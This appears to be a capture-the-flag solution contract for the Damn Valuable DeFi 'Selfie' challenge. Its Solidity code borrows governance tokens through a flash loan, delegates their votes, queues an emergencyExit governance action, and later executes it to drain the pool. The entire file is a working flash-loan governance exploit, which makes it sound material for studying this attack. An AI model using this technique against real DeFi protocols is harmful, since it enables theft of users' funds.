pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
contract SelfieExploiter is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    address recovery;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token,
        address _recovery
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    // this is the callback function called when the pool sends this conctract the DVT tokens
    // here we can prepare the call data for queing the action to call emergenyExit with the recovery address on the Governance
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes memory // not used
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        // rrepare the calldata for the emergencyExit function call on the governacne
        bytes memory govdata = abi.encodeWithSignature("emergencyExit(address)", recovery);
        // queeue the action
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            govdata
        );
        // record the actionId
        actionId = _actionId;
        // payback the DVT tokenss to the pool
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    // the setup calls the pool flash loan which will then call into the onFlashLoan function defined above
    function exploitSetup() external returns(bool){
        uint amountRequired = 1_500_000e18;
        require(selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, ""));
        return true;
    }

    // this is called after 2 days to execute the queued action that we set earlier which will withdraw all the DVT tokens to the recovery wallet
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
        return true;
    }
}